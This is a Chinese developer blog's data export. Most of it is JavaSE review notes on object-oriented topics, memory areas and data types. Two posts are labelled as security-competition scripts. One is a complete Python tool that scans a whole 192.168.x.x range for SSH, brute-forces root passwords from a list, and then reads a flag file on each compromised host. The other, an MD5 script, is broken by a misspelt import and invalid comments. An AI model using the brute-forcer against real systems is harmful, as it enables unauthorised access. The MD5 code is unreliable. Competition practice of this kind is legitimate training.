{"meta":{"title":"Ather · Blog","subtitle":null,"description":"知其然知其所以然","author":"Atcher","url":"http://liuhaoan.github.io","root":"/"},"pages":[{"title":"关于","date":"2019-04-05T10:40:33.000Z","updated":"2019-04-08T08:44:43.119Z","comments":true,"path":"about/index.html","permalink":"http://liuhaoan.github.io/about/index.html","excerpt":"","text":"创建本博客纯属学习，如有问题请联系QQ：1280551527 ps：转载文章请注明来源，非常感谢！ 2019 年 4 月 博客建立 1、主要用来复习JavaSE相关知识 2、其次，记录参加信息安全与评估国赛所用到的一些基本Python脚本"},{"title":"分类","date":"2019-04-05T10:40:51.000Z","updated":"2019-04-08T08:44:43.120Z","comments":true,"path":"categories/index.html","permalink":"http://liuhaoan.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-04-05T10:40:40.000Z","updated":"2019-04-08T08:44:43.121Z","comments":false,"path":"tags/index.html","permalink":"http://liuhaoan.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"javaSE复习之——面向对象_内部类","slug":"javaSE复习之——面向对象-内部类","date":"2019-04-08T05:22:50.000Z","updated":"2019-04-08T11:51:45.602Z","comments":true,"path":"2019/04/08/javaSE复习之——面向对象-内部类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/javaSE复习之——面向对象-内部类/","excerpt":"内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在","text":"内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在 内部类的分类成员内部类 它定义在一个类的内部 局部内部类 它定义在一个方法或者一个作用域内部，它的访问仅限于方法内或者该作用域内 注意事项： 局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的 匿名内部类 匿名内部类应该是平时我们编写代码时用得最多的，在编写事件监听的代码时使用匿名内部类不但方便，而且使代码更加容易维护 例如：为按钮设置一个监听器12345678new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 静态内部类 它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static 内部类的面试题之 —— 内部类能不能访问外部类成员变量？ 答（成员内部类）： 内部类可以访问外部类的成员变量，因为编译器底层在创建成员内部类时，为成员内部类加上了指向外部类的引用 示例： 12外部类.this.成员变量外部类.this.成员方法 ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了 例子： 1234567891011121314151617181920class Circle &#123; private double radius = 0; public Circle(double radius) &#123; this.radius = radius; getDrawInstance().drawSahpe(); //必须先创建成员内部类的对象，再进行访问 &#125; private Draw getDrawInstance() &#123; return new Draw(); &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 &#125; &#125;&#125; 匿名内部类访问外部类成员底层实现原理： 我们用一段代码来举例：1234567891011121314public class Test &#123; public static void main(String[] args) &#123; &#125; public void test() &#123; final int a = 10; new Thread()&#123; public void run() &#123; System.out.println(a); &#125;; &#125;.start(); &#125;&#125; 当test方法调用，系统会给内部类自动加上构造器（这也就是为什么匿名内部类不能有构造方法的原因），这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。这样就解决了生命周期的问题 但是还有一个数据不一致的问题，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。 数据不一致问题的解决方法就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因 在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用final修饰 jdk8新特性 局部内部类与匿名内部类访问外部类成员变量，外部类那个变量不需要final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。 匿名内部类 格式： 12345//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法new 类名或者抽象类名() &#123; &#125;.方法名（）//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法 解释： 可以吧new 到 } 的代码看作创建的一个子类对象实例，所以后面可以.方法名调用 好处： 可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。 注意事项： 1、匿名内部类只针对重写一个方法使用，如果要一次性重写多个方法的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则重新定义类。 2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。 3、匿名内部类中不能定义构造函数。 4、使用匿名内部类时，我们必须是继承一个类或者实现一个接口，但是两者不可兼得，只能继承一个类或者实现一个接口。 5、匿名内部类中不能存在任何的静态成员变量和静态方法。 6、匿名内部类属于局部内部类，所以局部内部类所有限制都在匿名内部类上生效 7、匿名内部类不能是抽象的，它必须实现继承的类或者接口中的抽象方法 链式编程： 特点： 调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"内部类","slug":"内部类","permalink":"http://liuhaoan.github.io/tags/内部类/"},{"name":"匿名内部类","slug":"匿名内部类","permalink":"http://liuhaoan.github.io/tags/匿名内部类/"},{"name":"链式编程","slug":"链式编程","permalink":"http://liuhaoan.github.io/tags/链式编程/"}]},{"title":"网络攻防之——Python实现MD5加密","slug":"网络攻防之——Python实现MD5加密","date":"2019-04-08T02:27:04.000Z","updated":"2019-04-08T11:47:03.871Z","comments":true,"path":"2019/04/08/网络攻防之——Python实现MD5加密/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现MD5加密/","excerpt":"代码示例","text":"代码示例 123456789101112#!/usr/bin/python3import hashilbstr = input(“请输入要解密的字符串：”)md5 = hashlib.md5()//创建MD5加密对象md5.update(str.encode(\"utf-8\"))//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密print(md5.hexdigest())//获取MD5加密后的16进制输出打印","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"MD5加密","slug":"MD5加密","permalink":"http://liuhaoan.github.io/tags/MD5加密/"},{"name":"Python","slug":"Python","permalink":"http://liuhaoan.github.io/tags/Python/"}]},{"title":"网络攻防之——Python实现ssh端口扫描并爆破","slug":"网络攻防之——Python实现ssh端口扫描并爆破","date":"2019-04-08T02:23:38.000Z","updated":"2019-04-08T11:45:23.015Z","comments":true,"path":"2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/","link":"","permalink":"http://liuhaoan.github.io/2019/04/08/网络攻防之——Python实现ssh端口扫描并爆破/","excerpt":"代码示例","text":"代码示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python3import threadingimport pexpectfrom socket import *key = [pexpect.TIMEOUT, \"#\", \"\\$\", \"&gt;\", \"&gt;&gt;&gt;\", \"&amp;\"]loginKey = [pexpect.TIMEOUT, \"[p|P]assword\", \"yes\"]def getFlag(p, ret): p.sendline(\"cat ../../../../flag\") p.expect(key) ret += \" flag:\\n\" + str(p.before) print(ret) file = open(\"flag.txt\", \"a+\") file.write(ret) file.close()def getPass(ip, passwd): p = pexpect.spawn(\"ssh root@\" + ip, timeout=1) try: b = p.expect(loginKey) if b == 1: p.sendline(passwd) b = p.expect(key) if b &gt; 0: getFlag(p, ip + \" passwd:\" + passwd) return 1 except: pass finally: p.close() return 0def scan(ip): s = socket(AF_INET, SOCK_STREAM) s.settimeout(1) try: s.connect((ip, 22)) b = True for n in open(\"passwd\"): passwd = n.strip(); if getPass(ip, passwd) == 1: b = False break if b: file = open(\"ip.txt\", \"a+\") file.write(ip + \"\\n\") file.close() except: pass finally: s.close()for n in range(1, 255): for nn in range(1, 255): ip = \"192.168.\" + str(n) + \".\" + str(nn) while True: if len(threading.enumerate()) &lt; 255: break threading.Thread(target=scan, args=(ip,)).start()","categories":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/categories/网络攻防/"}],"tags":[{"name":"网络攻防","slug":"网络攻防","permalink":"http://liuhaoan.github.io/tags/网络攻防/"},{"name":"python","slug":"python","permalink":"http://liuhaoan.github.io/tags/python/"},{"name":"ssh","slug":"ssh","permalink":"http://liuhaoan.github.io/tags/ssh/"},{"name":"爆破","slug":"爆破","permalink":"http://liuhaoan.github.io/tags/爆破/"},{"name":"端口扫描","slug":"端口扫描","permalink":"http://liuhaoan.github.io/tags/端口扫描/"}]},{"title":"javaSE复习之——面向对象_包与权限修饰符","slug":"javaSE复习之——面向对象-包与权限修饰符","date":"2019-04-07T09:55:53.000Z","updated":"2019-04-08T11:49:47.182Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-包与权限修饰符/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-包与权限修饰符/","excerpt":"包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。","text":"包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。 定义包的格式12package 包名;多级包用“.”分开 例子： 1package java.util.Scanner; 在这里当然也可以把Scanner用*代替，*就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为需要遍历该包所有类。 ps：在开发中一般都不使用，而是导入具体的类。 定义时的注意事项 1、必须是程序的第一条可执行语句2、package在一个java文件中只能有一个3、包名的格式为域名倒写 例：com.aikan0.add这个add就是这个包的作用。 生成包命令1javac -d . 源文件名 ps：了解一下就好了 面试题——package、import、class有没有顺序关系？ 解答： 有，并且package &gt; import &gt; class 权限修饰符 四种权限修饰符 本类 同一个包下(子类和无关类) 不同包下(子类) 不同包下(无关类) private Y 默认 Y Y protected Y Y Y public Y Y Y Y ps：protected表示受保护的，就是保护权限只给给自己的子类，一般不用在变量，而是用在成员变量或者成员方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"包","slug":"包","permalink":"http://liuhaoan.github.io/tags/包/"},{"name":"权限修饰符","slug":"权限修饰符","permalink":"http://liuhaoan.github.io/tags/权限修饰符/"}]},{"title":"javaSE复习之——面向对象_接口","slug":"javaSE复习之——面向对象-接口","date":"2019-04-07T09:22:46.000Z","updated":"2019-04-08T11:50:50.335Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-接口/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-接口/","excerpt":"接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口","text":"接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口 特点： a : 接口用关键字interface表示 1interface 接口名 &#123;&#125; b : 类实现接口用implements表示 1class 类名 implements 接口名 &#123;&#125; c : 接口不能实例化 那么，接口如何实例化呢? 答：按照多态的方式来实例化。 d : 接口的子类 a : 可以是抽象类。但是意义不大。b : 可以是具体类。要重写接口中的所有抽象方法。(推荐方案) 注意事项： 1、接口中的成员变量默认都是常量，他会自动加public static final关键字，并且可以互相交换位置，新手平时都手动给出。 2、接口中没有构造方法 3、接口是干爹，不是亲爹，子类不能用super访问父类中的内容，子类默认继承object类 4、接口中不能定义非抽象方法 5、类与接口是实现关系而非继承关系（干爹） 6、同一个类可以实现多个接口 例子：1class Deom implements InterA,InterB &#123;&#125; 8、接口不能实现接口（implements），但是却可以继承（extends） 类 与 接口的关系 a : 类与类： 继承关系,只能单继承,可以多层继承。 b : 类与接口： 实现关系,可以单实现,也可以多实现。并且还可以在继承一个类的同时实现多个接口。 c : 接口与接口： 继承关系,可以单继承,也可以多继承。 抽象类 与 接口的区别： 抽象类： 和普通的类差不多，只是可以定义抽象方法而已 接口： 成员变量：只可以常量成员方法：只可以抽象 设计理念区别（重要）： 抽象类： 定义的是该继承体系的共性功能 例：每个学生都需要学习 接口： 定义的是该继承体系的扩展性功能 例：每个学生在学校的学习方式都不一样，这样就需要扩展 设计理念区别： 接口是对动作的抽象，抽象类是对根源的抽象。 抽象类表示的是：这个对象是什么。 接口表示的是：这个对象能做什么。 比如：男人，女人，这两个类，他们的抽象类是人。说明：他们都是人，他们的根源就是人 又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。说明：他们都可以吃东西，他们的根源是不同的，但是做的动作却相同的。 结论 在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。 当关注一个事物的本质的时候，用抽象类； 当关注一个要做的动作的时候，用接口。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"接口","slug":"接口","permalink":"http://liuhaoan.github.io/tags/接口/"}]},{"title":"javaSE复习之——面向对象_抽象类","slug":"javaSE复习之——面向对象-抽象类","date":"2019-04-07T09:04:40.000Z","updated":"2019-04-08T11:50:10.066Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-抽象类/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-抽象类/","excerpt":"抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写","text":"抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写 抽象类的几个问题： 1、为什么不直接定义空方法？ 解答：抽象类可以正确的引导使用者正确使用它们，减少被误用 2、抽象类有什么作用？ 解答：增强程序的扩展性和兼容性，规范编程 抽象类中的面试题： 1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化） 2、abstract不能和static共存 原因：static让这个方法是静态方法，而静态方法可以用类名.方法名调用，而静态方法可以类名.方法名调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而abstract不能和static共存。 3、abstract不能和final共存 原因：abstract强制子类重写，而final表示最终的，它不让子类重写，这里形成了冲突。 4、abstract不能和private共存 原因：abstract强制子类重写，而private让子类访问不到，所以它们两个修饰符形成了冲突。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"抽象类","slug":"抽象类","permalink":"http://liuhaoan.github.io/tags/抽象类/"}]},{"title":"javaSE复习之——面向对象_多态","slug":"javaSE复习之——面向对象-多态","date":"2019-04-07T07:58:33.000Z","updated":"2019-04-08T11:50:27.981Z","comments":true,"path":"2019/04/07/javaSE复习之——面向对象-多态/","link":"","permalink":"http://liuhaoan.github.io/2019/04/07/javaSE复习之——面向对象-多态/","excerpt":"多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi();","text":"多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi(); 成员变量 编译、运行看左边(父类) 也就是创建对象后，子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)，父类引用对象就优先调用父类（编译运行看左边） 解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是父类那么这个引用指向super区域，否则指向this区域 成员方法 编译看左边(父类)、运行看右边(子类)。动态绑定 ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。 静态成员方法 与成员变量同理，编译、运行看左边(父类)，所以多态中静态方法不存在重写 多态的弊端 父类引用不能使用子类特有的属性和行为，但是能通过1zi b = (zi)a; //强转类型 多态的好处 1、提高了代码的维护性(继承保证) 2、提高了代码的扩展性(由多态保证) 多态的使用 1、开发是很少在创建对象的时候使用多态，而是直接创建子类引用子类对象 2、在需要使用方法使代码简洁时，当做参数使用多态效果最好，因为扩展性强 比如：现有三个类“动物”“狗”“猫”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用方法函数来使代码简洁，在调用这个方法时可以创建好一个 狗 或 猫 的对象然后传给参数，这就需要使用到多态了，如果不使多态那么就需要给狗和猫分别创建一个函数。 不过在方法中使用多态还有一个问题：狗 和 猫 都有各自特有的功能与属性，如果调用猫的功能，但是传入的对象是狗，那么就出错了。 解决方法：关键字 instanceof ps：了解一下，开发中用到的不多，一般都用到方法重写 代码实例：12对象变量A instanceof 对象变量B//如果是相同的类返回true 多态中的代码分析123456789101112131415161718192021222324252627282930class A &#123; public void show() &#123; show2(); //这里调用的是子类中的show方法 &#125; public void show2() &#123; System.out.println(\"我\"); &#125;&#125;class B extends A &#123; public void show2() &#123; System.out.println(\"爱\"); &#125;&#125;class C extends B &#123; public void show() &#123; super.show(); &#125; public void show2() &#123; System.out.println(\"你\"); &#125;&#125;public class Test2DuoTai &#123; public static void main(String[] args) &#123; A a = new B(); a.show();//返回一个爱 B b = new C(); b.show(); &#125;&#125; 得出结果： 在多态中，父类中的方法调用另一个方法，且被调用的方法都存在于子类与父类中的情况下，优先调用子类的方法，也就是父类方法成为了一个跳板，跳转到了子类的方法中 还是那句话： 成员方法编译看左边(父类)、运行看右边(子类) 成员变量编译看左边(父类)、运行看左边(父类)","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"多态","slug":"多态","permalink":"http://liuhaoan.github.io/tags/多态/"}]},{"title":"javaSE复习之——面向对象_代码块与继承","slug":"javaSE复习之——面向对象-代码块与继承","date":"2019-04-06T02:08:03.000Z","updated":"2019-04-08T11:50:22.436Z","comments":true,"path":"2019/04/06/javaSE复习之——面向对象-代码块与继承/","link":"","permalink":"http://liuhaoan.github.io/2019/04/06/javaSE复习之——面向对象-代码块与继承/","excerpt":"一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{}","text":"一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{} 如何创建一个静态方法？ 在方法中加static修饰，那么这个方法是静态方法（函数） 在载入类的时候就这个方法就已经在类的静态区创建，不需要创建对象即可调用 静态变量 在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。 比如 第一条命令给这个变量赋值“张三” 第二条命令又给这个变量赋值“李四” 那么之后调用这个变量时，这个变量返回“李四” 二、构造方法 与 代码块构造方法 构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果 系统会自动创建空参构造，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出 代码块局部代码块 它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率 构造代码块 (初始化块) 构造代码块可以在一个类中执行，执行完就弹栈， 例： 1class Deom&#123; &#123;这就是构造代码块&#125; &#125; ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行 构造代码块可以把一些初始化的代码放在其中，每次调用构造都执行，并且在构造方法之前执行 ps：实际上构造方法开发中用到的不多，但是面试可能会问 构造代码块可以做的功能： 我们可以做诸如统计创建对象的次数等功能。 静态代码块 例： 1static &#123;&#125; 作用： 用于给类进行初始化，在加载的时候就执行，并且只执行一次。 一般用于加载驱动，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。 比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。 注意事项： 1、静态代码块不能访问普通变量 2、静态代码块在 类 中，优先于主方法（面试题） 3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块 类的继承 ps：继承与升级一般都用作系统升级 父类 &gt; 子类 继承的定义 class 子类(当前类) extends 父类(继承的类) ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法 继承的好处： 1、可以提升代码的复用性，不需要打太多重复的代码 2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错 3、是多态的前提 继承的弊端： 1、耦合性非常强，父类有的一些属性可能是子类不需要的 开发原则： 高内聚、低耦合 耦合：类与类的关系 内聚：自己完成某件事的能力 在java中继承的特点： 1、Java只支持单继承不支持多继承（一个孩子只能有一个爹） 2、可以多层继承（继承体系），也就是可以继承爷爷 3、想看这个体系所有功能就看最底层类，也就是儿子类 4、想看这个体系共性功能就要看顶层类，也就是爷爷类 注意事项 1、子类只能继承父类所有非私有的成员（方法和变量） 2、子类不能继承父类的构造方法，因为构造方法必须和类名一样，而继承是不一样的，但可以通过super关键字去访问父类的构造方法 3、不要为了部分功能而去继承，因为继承体现的是一种关系，就算有相同属性也不一定继承。 比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。 4、子父类如果出现相同变量那么会采取就近原则，但是在真正的项目开发中不会出现这种情况，因为没有意义 5、子类无论如何都会访问父类中的构造方法 6、在全是静态方法的类中，构造方法必须私有化，这样防止别人创建这个类的对象 this和super this： 代表当前对象的引用，如果继承了父类，那么也可以引用父类 super： 代表对父类的引用 一些使用实例： this.成员变量名 调用本类成员变量，也可以调用父类的，但是采用就近原则 super.成员变量名 调用父类的成员变量 ps：成员变量名可以是方法名 调用父类中的构造方法: 1super(...); 调用本类中的构造方法: 1this(...); ps：一个方法里只能调用其中的一个 注意事项 类中的构造方法系统都自带super()；但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以super（参数1，参数2....）；也可以用this调用本类的有参构造，进而间接调用父类有参构造 构造方法的调用都是从上到下，即从父类调用到子类，可以理解为一个队列 继承中的面试 1、假设有 子类方法、子类、父类 且其中都有一个num的变量，那么：num用方法中的变量，this.num调用本类中的变量，super.num调用父类中的变量 2、在继承中不要忘记了每个构造方法都会有一个super（）；访问父类 3、override 重写：子类中出现了和父类中方法声明一模一样的方法。与返回值类型有关,返回值类型是一致的 4、overload 重载：本类中出现的方法名一样，参数列表不同的方法。与返回值类型无关。 继承中的成员方法关系 、子、父类有相同方法并且返回值类型也一样，那么会调用子类的方法，也叫方法重写 final概述 它可以用来修饰 类与变量 修饰之后表示它是“最终的”不能被继续操作了 final修饰特点 修饰类，类不能被继承 修饰变量：变量就变成了常量，只能被赋值一次，通常与public static配套使用 修饰方法：方法不能被重写，表示最终方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"代码块","slug":"代码块","permalink":"http://liuhaoan.github.io/tags/代码块/"}]},{"title":"javaSE复习之——java的五大内存区域","slug":"javaSE复习之——java的五大内存区域","date":"2019-04-05T15:40:17.000Z","updated":"2019-04-08T12:27:31.029Z","comments":true,"path":"2019/04/05/javaSE复习之——java的五大内存区域/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——java的五大内存区域/","excerpt":"五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆","text":"五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆 Java程序运行过程 1、加载字节码文件到方法区（.class文件） 2、程序代码依次进栈（jvm执行main方法） 堆（heap）： 最大的一块内存，存放对象实例的地方 1、Java堆是垃圾收集器管理的主要区域，也称GC堆。 2、Java堆物理上可不连续，逻辑上连续。 3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常 虚拟机栈（stack）： java方法执行时的内存模型 栈帧 1、每个方法都会在虚拟机栈中创建一个对应的栈帧，用于存储局部变量表，操作数栈，动态链接，方法出口等信息。 2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈入栈到出栈。 局部变量表 1、存放编译期可知在方法中各种基本数据类型和对象的引用，基本数据类型直接存值, 引用数据类型存地址。 #本地方法栈： 本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务 本地方法 关键字 native ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。 有的虚拟机将本地方法栈和虚拟机栈合在一起，如HotSpot。 方法区： 存已经被虚拟机加载的类信息（Class对象）、常量、静态变量、即时编译器JIT编译过后的代码数据。 jdk 1.7、1.8 对方法区做出了修改，1.8 取消了方法区。 1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap 2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。 3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。 运行时常量池 1、在方法区，用来存放编译期生成的各种符号引用和字面量 2、编译期将各种符号引用和字面量放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时复制到局部变量表中。1.7开始字符串常量池被移入堆中。 符号引用： String ss = “asdsfg” ss这个符号就是符号引用。解析阶段解析为直接引用 字面量： 值本身 如 asdfg 常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。 寄存器（程序计数器）： 占用较小的一块内存空间，当执行Java方法时记录正在执行的虚拟机字节码指令地址，如果执行Native方法则计时器值为空。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"javaSE","slug":"javaSE","permalink":"http://liuhaoan.github.io/tags/javaSE/"}]},{"title":"javaSE复习之——数据类型","slug":"javaSE复习之——数据类型","date":"2019-04-05T12:47:43.000Z","updated":"2019-04-08T11:51:09.510Z","comments":true,"path":"2019/04/05/javaSE复习之——数据类型/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——数据类型/","excerpt":"基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D","text":"基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D 整数型（整数常亮默认为int类型） byte：占一个字节 -128 ~ 127 short：占两个字节 -2^15 ~ 2^15-1 int：占四个字节 -2^31 ~ 2^31-1 long：占八个字节 -2^63 ~ 2^63-1 浮点型（小数型，默认小数是double类型） float：占四个字节 -2^128 ~ 2^128 绝对保证精度6位，但有7位有效数字 double：占八个字节 -2^1024 ~ 2^1024 绝对保证精度15位，但有16位有效数字 字符型 char：占两个字节 0 ~ 65535 布尔型（判断） boolean：理论八分之一字节，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小 ps：float由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"数据类型","slug":"数据类型","permalink":"http://liuhaoan.github.io/tags/数据类型/"}]},{"title":"javaSE复习之——进制编码","slug":"javaSE复习之——进制编码","date":"2019-04-05T12:27:44.000Z","updated":"2019-04-08T11:49:23.610Z","comments":true,"path":"2019/04/05/javaSE复习之——进制编码/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——进制编码/","excerpt":"进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0","text":"进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 